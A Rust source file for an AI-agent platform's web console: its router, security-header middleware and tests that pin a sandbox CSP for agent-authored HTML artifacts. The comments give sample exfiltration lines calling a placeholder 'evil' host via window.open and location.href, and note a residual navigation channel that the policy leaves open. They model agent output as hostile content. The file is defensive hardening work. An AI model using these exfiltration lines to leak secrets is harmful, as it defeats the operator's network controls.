use std::net::SocketAddr;
use std::sync::Arc;

use axum::http::{HeaderValue, Method, Request};
use axum::middleware::Next;
use axum::response::Response;
use axum::Router;
use tower_governor::{governor::GovernorConfigBuilder, GovernorLayer};
use tower_http::compression::predicate::{DefaultPredicate, NotForContentType, Predicate};
use tower_http::compression::CompressionLayer;
use tower_http::cors::CorsLayer;
use tower_http::services::ServeDir;
use tower_http::trace::TraceLayer;

use crate::auth::AuthToken;
use crate::handlers::{
    a2a, agent_convo, agent_detail, agents, artifacts, audit, channels, chat, config_page,
    connectors, costs, dashboard, doctor, escalations, events, events_log, files, hal_page,
    identity_page, logs, management, manual_page, marketplace, mcp_page, mentions, notifications,
    oauth, observability, pipeline_ui, pipelines, plugins, prefs, profile, resources_page, roles,
    schedules, scratchpad, secrets, tasks, teams, tools, webhooks, webhooks_page,
};
use crate::state::AppState;

/// Agent-authored HTML. `sandbox` without `allow-same-origin` puts the response in
/// a unique opaque origin: no `document.cookie`, no parent DOM, no storage.
/// `default-src 'none'` with no `connect-src` blocks fetch/XHR/WebSocket/beacon.
///
/// **NEVER add `allow-same-origin` here** — combined with `allow-scripts` it lets
/// the document remove its own sandbox, which turns every artifact into stored XSS
/// against an operator console that can approve escalations.
///
/// The load-bearing controls are the two sandbox tokens that are ABSENT:
/// `allow-same-origin` (with `allow-scripts` it lets the document unsandbox
/// itself) and `allow-popups` (it turns any click into
/// `window.open('https://evil/?d=' + secret)` — an egress channel the kernel
/// withheld, since `artifact-write` declares `network = false`).
///
/// `form-action 'none'` and `base-uri 'none'` are defence in depth, not the
/// primary control: omitting `allow-forms` already blocks submission, and with
/// `default-src 'none'` there are no subresources for a `<base>` to redirect.
/// They are pinned anyway because `default-src` does not fall back for either
/// (that is spec, not a browser quirk), so they keep holding if someone later
/// adds `allow-forms` to the token list.
///
/// RESIDUAL, not closable by CSP while `allow-scripts` is granted: the document can
/// still `location.href = 'https://evil/?d=' + secret` and navigate itself away.
/// That is loud — the frame visibly leaves — but it works. Revoking `allow-scripts`
/// is the only complete fix and would reduce artifacts to static posters.
pub(crate) const ARTIFACT_SANDBOX_CSP: &str = "sandbox allow-scripts; \
     default-src 'none'; \
     base-uri 'none'; \
     form-action 'none'; \
     img-src data: blob:; \
     style-src 'unsafe-inline'; \
     script-src 'unsafe-inline'; \
     font-src data:; \
     frame-ancestors 'self'";

/// Matches only `GET /artifacts/{id}/raw`. Ids are UUIDs and the route pattern is
/// fixed, so no title or user input can steer another response into this policy.
fn is_artifact_raw(path: &str) -> bool {
    path.starts_with("/artifacts/") && path.ends_with("/raw")
}

/// Sandbox policy for the raw artifact route. `frame-ancestors 'self'` governs
/// framing instead of `X-Frame-Options: DENY`, which would block the viewer's own
/// iframe — hence the explicit `remove`.
fn apply_artifact_headers(headers: &mut axum::http::HeaderMap) {
    headers.insert(
        axum::http::HeaderName::from_static("content-security-policy"),
        HeaderValue::from_static(ARTIFACT_SANDBOX_CSP),
    );
    headers.remove(axum::http::HeaderName::from_static("x-frame-options"));
    headers.insert(
        axum::http::HeaderName::from_static("x-content-type-options"),
        HeaderValue::from_static("nosniff"),
    );
    headers.insert(
        axum::http::HeaderName::from_static("referrer-policy"),
        HeaderValue::from_static("no-referrer"),
    );
}

/// The app policy every other response carries.
fn apply_app_headers(headers: &mut axum::http::HeaderMap) {
    headers.insert(
        axum::http::HeaderName::from_static("content-security-policy"),
        HeaderValue::from_static(
            // 'unsafe-eval' is required by the standard Alpine.js build, which compiles
            // x-data / x-show / @click expression strings via `new Function(...)`. The
            // CSP-friendly Alpine build (alpinejs/csp) avoids this but disallows inline
            // expressions in templates — switching would require rewriting every template
            // that embeds an Alpine component.
            "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; \
             style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; \
             font-src 'self' https://fonts.gstatic.com; \
             img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'",
        ),
    );
    headers.insert(
        axum::http::HeaderName::from_static("x-frame-options"),
        HeaderValue::from_static("DENY"),
    );
    headers.insert(
        axum::http::HeaderName::from_static("x-content-type-options"),
        HeaderValue::from_static("nosniff"),
    );
}

/// Middleware that sets security headers on every response.
///
/// The path is inspected **before** `next.run()` because these `insert` calls
/// overwrite: left unbranched they would replace the artifact sandbox policy with
/// the app policy and stamp `X-Frame-Options: DENY`, simultaneously breaking the
/// viewer iframe and removing the isolation.
async fn add_security_headers(request: Request<axum::body::Body>, next: Next) -> Response {
    let raw_artifact = is_artifact_raw(request.uri().path());
    let mut response = next.run(request).await;
    let headers = response.headers_mut();
    if raw_artifact {
        apply_artifact_headers(headers);
    } else {
        apply_app_headers(headers);
    }
    response
}

pub fn build_router(
    state: AppState,
    bind_addr: SocketAddr,
    auth_token: AuthToken,
) -> Result<Router, anyhow::Error> {
    // CORS: allow only the bound address origin.
    // Replace INADDR_ANY (0.0.0.0) with 127.0.0.1 so the header value is a valid origin.
    let origin = format!(
        "http://{}",
        if bind_addr.ip().is_unspecified() {
            std::net::SocketAddr::new(
                std::net::IpAddr::V4(std::net::Ipv4Addr::LOCALHOST),
                bind_addr.port(),
            )
        } else {
            bind_addr
        }
    );
    let cors = CorsLayer::new()
        .allow_origin(
            origin
                .parse::<HeaderValue>()
                .map_err(|e| anyhow::anyhow!("invalid CORS origin '{}': {}", origin, e))?,
        )
        .allow_methods([Method::GET, Method::POST, Method::DELETE])
        .allow_credentials(true)
        .allow_headers([
            axum::http::header::CONTENT_TYPE,
            axum::http::header::AUTHORIZATION,
            axum::http::HeaderName::from_static("x-csrf-token"),
        ]);

    // Rate limiting: 60 req/min burst, 1 req/s steady replenishment.
    let governor_conf = Arc::new(
        GovernorConfigBuilder::default()
            .per_second(1)
            .burst_size(60)
            .finish()
            .ok_or_else(|| anyhow::anyhow!("invalid governor rate-limit config"))?,
    );

    // Unauthenticated routes — external services cannot carry our auth token.
    // These are merged AFTER the authenticated router so they bypass the auth layer
    // but still get security headers, compression, tracing, and rate limiting.
    let webhook_routes = Router::new()
        .route(
            "/api/v1/webhooks/incoming/{endpoint_id}",
            axum::routing::post(webhooks::incoming_webhook),
        )
        // Restrict body size on the unauthenticated webhook endpoint to prevent
        // memory exhaustion DoS. Most webhook payloads are well under 100 KiB.
        .layer(axum::extract::DefaultBodyLimit::max(256 * 1024)) // 256 KiB
        .with_state(Arc::new(state.clone()));

    // Telegram Bot API webhooks — same handler as `agentos-api`; must live on the
    // Web UI server because `agentos web serve` only exposes this Axum app (not the
    // standalone REST API). Without this route, `setWebhook` succeeds but Telegram
    // POSTs hit 404 and chat_id auto-discovery never runs.
    let telegram_webhook_routes = Router::new()
        .route(
            "/api/v1/webhooks/telegram/{channel_id}",
            axum::routing::post(agentos_api::handlers::webhooks::telegram_webhook),
        )
        .route(
            "/api/v1/webhooks/whatsapp/{channel_id}",
            axum::routing::get(agentos_api::handlers::webhooks::whatsapp_webhook_verify)
                .post(agentos_api::handlers::webhooks::whatsapp_webhook),
        )
        .layer(axum::extract::DefaultBodyLimit::max(256 * 1024))
        .with_state(state.service.clone());

    Ok(Router::new()
        .route("/", axum::routing::get(dashboard::index))
        // Login (bypasses auth middleware — see require_auth)
        .route(
            "/login",
            axum::routing::get(crate::auth::login_page).post(crate::auth::login_submit),
        )
        // Agents
        .route(
            "/agents",
            axum::routing::get(agents::list).post(agents::connect),
        )
        .route("/agents/{name}", axum::routing::delete(agents::disconnect))
        // Agent detail
        .route(
            "/agents/{name}/detail",
            axum::routing::get(agent_detail::detail),
        )
        .route(
            "/agents/{name}/identity",
            axum::routing::get(identity_page::page),
        )
        .route(
            "/agents/{name}/permissions",
            axum::routing::post(agent_detail::grant_permission),
        )
        .route(
            "/agents/{name}/permissions/revoke",
            axum::routing::post(agent_detail::revoke_permission),
        )
        .route(
            "/agents/{name}/settings",
            axum::routing::post(agent_detail::update_settings),
        )
        // Tasks
        .route("/tasks", axum::routing::get(tasks::list))
        .route("/tasks/{id}", axum::routing::get(tasks::detail))
        .route("/tasks/{id}/cancel", axum::routing::post(tasks::cancel))
        .route("/tasks/{id}/resume", axum::routing::post(tasks::resume))
        .route("/tasks/{id}/trace", axum::routing::get(tasks::trace_page))
        .route(
            "/tasks/{id}/snapshots",
            axum::routing::get(tasks::snapshots),
        )
        .route(
            "/tasks/{id}/logs/stream",
            axum::routing::get(tasks::log_stream),
        )
        .route(
            "/api/tasks/{id}/trace",
            axum::routing::get(tasks::trace_json),
        )
        .route(
            "/api/tasks/{id}/context/{idx}/raw",
            axum::routing::get(tasks::context_raw),
        )
        // Tools
        .route(
            "/tools",
            axum::routing::get(tools::list).post(tools::install),
        )
        .route("/tools/{name}", axum::routing::delete(tools::remove))
        // Marketplace
        .route("/marketplace", axum::routing::get(marketplace::list))
        .route(
            "/marketplace/{name}",
            axum::routing::get(marketplace::detail),
        )
        .route(
            "/marketplace/{name}/review",
            axum::routing::post(marketplace::submit_review),
        )
        // Secrets
        .route(
            "/secrets",
            axum::routing::get(secrets::list).post(secrets::create),
        )
        .route("/secrets/{name}", axum::routing::delete(secrets::revoke))
        // Connectors & OAuth
        .route(
            "/connectors",
            axum::routing::get(connectors::list_connectors),
        )
        .route(
            "/connectors/{connector_id}/disconnect",
            axum::routing::post(connectors::disconnect_connector),
        )
        .route(
            "/api/connectors",
            axum::routing::get(connectors::list_connectors_json),
        )
        .route(
            "/auth/{connector_id}/start",
            axum::routing::get(oauth::start_oauth),
        )
        .route(
            "/auth/{connector_id}/callback",
            axum::routing::get(oauth::oauth_callback),
        )
        // Pipelines
        .route("/pipelines", axum::routing::get(pipeline_ui::list))
        .route(
            "/pipelines/new",
            axum::routing::get(pipeline_ui::new_builder),
        )
        .route(
            "/pipelines/{name}/edit",
            axum::routing::get(pipeline_ui::edit_builder),
        )
        .route(
            "/pipelines/{name}/clone",
            axum::routing::post(pipeline_ui::clone_pipeline),
        )
        .route(
            "/pipelines/{name}/delete",
            axum::routing::post(pipeline_ui::delete_pipeline),
        )
        .route("/pipelines/run", axum::routing::post(pipelines::run))
        .route(
            "/api/pipelines",
            axum::routing::post(pipeline_ui::save_pipeline),
        )
        .route(
            "/api/pipelines/import",
            axum::routing::post(pipeline_ui::import_yaml),
        )
        .route(
            "/api/pipelines/export",
            axum::routing::post(pipeline_ui::export_yaml),
        )
        .route(
            "/api/pipelines/run",
            axum::routing::post(pipeline_ui::run_pipeline),
        )
        .route(
            "/api/pipelines/runs/{run_id}/events",
            axum::routing::get(pipeline_ui::run_events),
        )
        // Dashboard partials
        .route(
            "/dashboard-stats",
            axum::routing::get(dashboard::stats_partial),
        )
        .route(
            "/dashboard-agents",
            axum::routing::get(dashboard::agents_partial),
        )
        .route(
            "/dashboard-tasks",
            axum::routing::get(dashboard::tasks_partial),
        )
        .route(
            "/dashboard-recent-audit",
            axum::routing::get(dashboard::recent_audit_partial),
        )
        // Agent-to-Agent Conversations
        .route("/agent-chat", axum::routing::get(agent_convo::list))
        .route(
            "/agent-chat/new",
            axum::routing::post(agent_convo::new_convo),
        )
        .route("/agent-chat/{id}", axum::routing::get(agent_convo::detail))
        .route(
            "/agent-chat/{id}/stop",
            axum::routing::post(agent_convo::stop),
        )
        .route(
            "/agent-chat/{id}/stream",
            axum::routing::get(agent_convo::stream),
        )
        // File upload and management
        .route("/files", axum::routing::get(files::list))
        .route(
            "/files/upload",
            axum::routing::post(files::upload)
                .layer(axum::extract::DefaultBodyLimit::max(101 * 1024 * 1024)),
        )
        .route("/files/{id}/delete", axum::routing::post(files::delete))
        .route("/files/{id}/download", axum::routing::get(files::download))
        .route(
            "/api/files/upload",
            axum::routing::post(files::upload_api)
                .layer(axum::extract::DefaultBodyLimit::max(101 * 1024 * 1024)),
        )
        .route("/api/files/search", axum::routing::get(files::search_api))
        // Agent-generated artifacts. `/raw` is the only route serving agent-authored
        // text/html — see ARTIFACT_SANDBOX_CSP. Both stay inside the auth-guarded
        // router; neither may be added to the require_auth bypass list.
        .route("/artifacts", axum::routing::get(artifacts::list))
        .route("/artifacts/{id}", axum::routing::get(artifacts::view))
        .route("/artifacts/{id}/raw", axum::routing::get(artifacts::raw))
        .route(
            "/artifacts/{id}/delete",
            axum::routing::post(artifacts::delete),
        )
        .route(
            "/api/mentions/search",
            axum::routing::get(mentions::search_api),
        )
        // Chat (session-based, separate from the task system)
        .route("/chat", axum::routing::get(chat::list))
        .route("/chat/new", axum::routing::post(chat::new_session))
        .route("/chat/{session_id}", axum::routing::get(chat::conversation))
        .route(
            "/chat/{session_id}/rename",
            axum::routing::post(chat::rename_session),
        )
        .route(
            "/chat/{session_id}/delete",
            axum::routing::post(chat::delete_session),
        )
        .route(
            "/chat/{session_id}/fork",
            axum::routing::post(chat::fork_session),
        )
        .route(
            "/chat/{session_id}/export",
            axum::routing::get(chat::export_session),
        )
        .route("/chat/{session_id}/send", axum::routing::post(chat::send))
        .route("/chat/{session_id}/stop", axum::routing::post(chat::stop))
        .route(
            "/chat/{session_id}/stream",
            axum::routing::get(chat::message_stream),
        )
        // Notifications (UNIS Phase 2)
        .route("/notifications", axum::routing::get(notifications::inbox))
        .route(
            "/notifications/stream",
            axum::routing::get(notifications::notification_stream),
        )
        .route(
            "/notifications/unread-count",
            axum::routing::get(notifications::unread_count),
        )
        .route(
            "/notifications/read",
            axum::routing::delete(notifications::clear_read_notifications),
        )
        .route(
            "/notifications/{id}",
            axum::routing::get(notifications::get_notification)
                .delete(notifications::dismiss_notification),
        )
        .route(
            "/notifications/{id}/respond",
            axum::routing::post(notifications::respond_to_notification),
        )
        // Costs
        .route("/costs", axum::routing::get(costs::dashboard))
        .route(
            "/api/costs/summary",
            axum::routing::get(costs::summary_json),
        )
        // Audit
        .route("/audit", axum::routing::get(audit::list))
        .route("/audit/{trace_id}", axum::routing::get(audit::detail))
        // Dedicated management parity pages
        .route("/plugins", axum::routing::get(plugins::list))
        .route("/plugins/discover", axum::routing::post(plugins::discover))
        .route("/plugins/{id}", axum::routing::get(plugins::detail))
        .route("/plugins/{id}/enable", axum::routing::post(plugins::enable))
        .route(
            "/plugins/{id}/disable",
            axum::routing::post(plugins::disable),
        )
        .route("/channels", axum::routing::get(channels::list))
        .route(
            "/channels/{id}/disconnect",
            axum::routing::post(channels::disconnect),
        )
        .route(
            "/schedules",
            axum::routing::get(schedules::list).post(schedules::create),
        )
        .route(
            "/api/schedules/preview",
            axum::routing::post(schedules::preview),
        )
        .route(
            "/schedules/{id}/pause",
            axum::routing::post(schedules::pause),
        )
        .route(
            "/schedules/{id}/resume",
            axum::routing::post(schedules::resume),
        )
        .route(
            "/schedules/{id}/delete",
            axum::routing::post(schedules::delete),
        )
        .route(
            "/roles",
            axum::routing::get(roles::list).post(roles::create),
        )
        .route("/roles/{name}", axum::routing::get(roles::detail))
        .route("/roles/{name}/delete", axum::routing::post(roles::delete))
        .route("/config", axum::routing::get(config_page::page))
        .route("/escalations", axum::routing::get(escalations::list))
        .route("/prefs", axum::routing::get(prefs::list))
        .route("/prefs/accept", axum::routing::post(prefs::accept))
        .route("/prefs/reject", axum::routing::post(prefs::reject))
        .route("/profile", axum::routing::get(profile::list))
        .route("/profile/forget", axum::routing::post(profile::forget))
        .route("/profile/edit", axum::routing::post(profile::edit))
        .route(
            "/escalations/{id}/resolve",
            axum::routing::post(escalations::resolve),
        )
        .route("/mcp", axum::routing::get(mcp_page::list))
        .route("/mcp/{name}/detach", axum::routing::post(mcp_page::detach))
        .route(
            "/webhooks",
            axum::routing::get(webhooks_page::list).post(webhooks_page::create),
        )
        .route(
            "/webhooks/{id}/delete",
            axum::routing::post(webhooks_page::delete),
        )
        .route(
            "/webhooks/{id}/rotate",
            axum::routing::post(webhooks_page::rotate),
        )
        .route("/doctor", axum::routing::get(doctor::page))
        .route("/manual", axum::routing::get(manual_page::page))
        .route("/manual/view", axum::routing::get(manual_page::view))
        .route("/scratchpad", axum::routing::get(scratchpad::page))
        .route(
            "/agents/{name}/scratchpad",
            axum::routing::get(scratchpad::agent_page),
        )
        .route("/resources", axum::routing::get(resources_page::page))
        .route("/events", axum::routing::get(events_log::page))
        .route("/events-log", axum::routing::get(events_log::page))
        .route(
            "/events/subscribe",
            axum::routing::post(events_log::create_subscription),
        )
        .route(
            "/events/subscriptions/{id}/delete",
            axum::routing::post(events_log::delete_subscription),
        )
        .route(
            "/events/emit",
            axum::routing::post(events_log::emit_test_event),
        )
        .route("/logs", axum::routing::get(logs::page))
        .route("/hal", axum::routing::get(hal_page::page))
        .route("/teams", axum::routing::get(teams::page))
        .route("/teams/{id}", axum::routing::get(teams::detail))
        .route("/a2a", axum::routing::get(a2a::page))
        // Management + observability parity pages
        .route("/management", axum::routing::get(management::page))
        .route(
            "/management/plugins/{id}/enable",
            axum::routing::post(management::plugin_enable),
        )
        .route(
            "/management/plugins/{id}/disable",
            axum::routing::post(management::plugin_disable),
        )
        .route(
            "/management/schedules/{id}/pause",
            axum::routing::post(management::schedule_pause),
        )
        .route(
            "/management/schedules/{id}/resume",
            axum::routing::post(management::schedule_resume),
        )
        .route(
            "/management/schedules/{id}/delete",
            axum::routing::post(management::schedule_delete),
        )
        .route("/observability", axum::routing::get(observability::page))
        // SSE event streams
        .route(
            "/events/dashboard",
            axum::routing::get(events::dashboard_stream),
        )
        .route("/events/agents", axum::routing::get(events::agents_stream))
        .route("/events/tasks", axum::routing::get(events::tasks_stream))
        .route("/events/costs", axum::routing::get(events::costs_stream))
        // Static files (served without auth — bypassed inside require_auth)
        .nest_service(
            "/static",
            ServeDir::new(
                std::env::var("AGENTOS_STATIC_DIR")
                    .map(std::path::PathBuf::from)
                    .unwrap_or_else(|_| {
                        std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("static")
                    }),
            ),
        )
        .with_state(state.clone())
        // Execution order (Axum layers run outermost-first on requests):
        // add_security_headers → GovernorLayer → CorsLayer → TraceLayer
        //   → CompressionLayer → Extension(auth_token) → require_auth
        //   → csrf_middleware → handler
        // CSRF middleware runs after auth, so only authenticated sessions reach it.
        .layer(axum::middleware::from_fn_with_state(
            state.clone(),
            crate::csrf::csrf_middleware,
        ))
        // Auth middleware — must be inside the Extension layer so the token is available.
        .layer(axum::middleware::from_fn_with_state(
            state.clone(),
            crate::auth::require_auth,
        ))
        // Extension layer — adds auth_token to every request before auth middleware runs.
        .layer(axum::Extension(auth_token))
        // Merge unauthenticated webhook routes — placed after auth layer so they
        // bypass auth/CSRF but still get security headers, compression, and rate limiting.
        .merge(webhook_routes)
        .merge(telegram_webhook_routes)
        .layer(CompressionLayer::new().compress_when(
            DefaultPredicate::new().and(NotForContentType::new("text/event-stream")),
        ))
        .layer(TraceLayer::new_for_http())
        .layer(cors)
        // Rate limiting — applied first on every incoming request.
        .layer(GovernorLayer::new(governor_conf))
        // Security headers OUTERMOST so they also land on responses that
        // short-circuit before the router: GovernorLayer's 429s, and any future
        // outer layer that returns early. Nothing inside can strip them, and the
        // artifact branch still reads the request path, which is unchanged here.
        .layer(axum::middleware::from_fn(add_security_headers)))
}

/// Header-policy tests.
///
/// `AppState` requires a booted `Kernel`, and this crate has no integration
/// harness that builds the router with an auth cookie, so these exercise the
/// middleware's header helpers directly — the same functions
/// `add_security_headers` calls, with the same branch condition.
#[cfg(test)]
mod security_header_tests {
    use super::{apply_app_headers, apply_artifact_headers, is_artifact_raw};
    use axum::http::HeaderMap;

    fn headers_for(path: &str) -> HeaderMap {
        let mut h = HeaderMap::new();
        // Simulate a handler that already set XFO, to prove the raw branch removes it.
        h.insert("x-frame-options", "DENY".parse().expect("static value"));
        if is_artifact_raw(path) {
            apply_artifact_headers(&mut h);
        } else {
            apply_app_headers(&mut h);
        }
        h
    }

    fn csp(h: &HeaderMap) -> String {
        h.get("content-security-policy")
            .and_then(|v| v.to_str().ok())
            .unwrap_or_default()
            .to_string()
    }

    #[test]
    fn artifact_raw_path_matching() {
        assert!(is_artifact_raw(
            "/artifacts/6f1c1f7e-0000-0000-0000-000000000000/raw"
        ));
        assert!(!is_artifact_raw(
            "/artifacts/6f1c1f7e-0000-0000-0000-000000000000"
        ));
        assert!(!is_artifact_raw("/artifacts"));
        assert!(!is_artifact_raw("/files/abc/raw"));
    }

    #[test]
    fn raw_has_sandbox_csp() {
        let csp = csp(&headers_for("/artifacts/abc/raw"));
        assert!(csp.contains("sandbox allow-scripts"), "got: {csp}");
        // With allow-scripts this would let the document unsandbox itself.
        assert!(!csp.contains("allow-same-origin"), "got: {csp}");
        assert!(csp.contains("default-src 'none'"), "got: {csp}");
        assert!(!csp.contains("connect-src"), "no fetch/XHR channel: {csp}");
        // `default-src` does NOT cover these two — that is spec, not a quirk.
        // Without them an agent with `network = false` can still exfiltrate by
        // auto-submitting a cross-origin form.
        assert!(csp.contains("form-action 'none'"), "got: {csp}");
        assert!(csp.contains("base-uri 'none'"), "got: {csp}");
        // window.open('https://evil/?d='+secret) on any click.
        assert!(!csp.contains("allow-popups"), "got: {csp}");
    }

    #[test]
    fn raw_has_no_x_frame_options() {
        let h = headers_for("/artifacts/abc/raw");
        assert!(
            h.get("x-frame-options").is_none(),
            "XFO would block the viewer iframe"
        );
        assert!(csp(&h).contains("frame-ancestors 'self'"));
        assert_eq!(
            h.get("x-content-type-options")
                .and_then(|v| v.to_str().ok()),
            Some("nosniff")
        );
        assert_eq!(
            h.get("referrer-policy").and_then(|v| v.to_str().ok()),
            Some("no-referrer")
        );
    }

    #[test]
    fn viewer_keeps_app_csp() {
        for path in ["/artifacts/abc", "/artifacts", "/files"] {
            let h = headers_for(path);
            assert_eq!(
                h.get("x-frame-options").and_then(|v| v.to_str().ok()),
                Some("DENY"),
                "{path} must keep XFO"
            );
            let csp = csp(&h);
            assert!(csp.contains("default-src 'self'"), "{path}: {csp}");
            assert!(csp.contains("frame-ancestors 'none'"), "{path}: {csp}");
            assert!(!csp.contains("sandbox"), "{path} must not relax: {csp}");
        }
    }
}
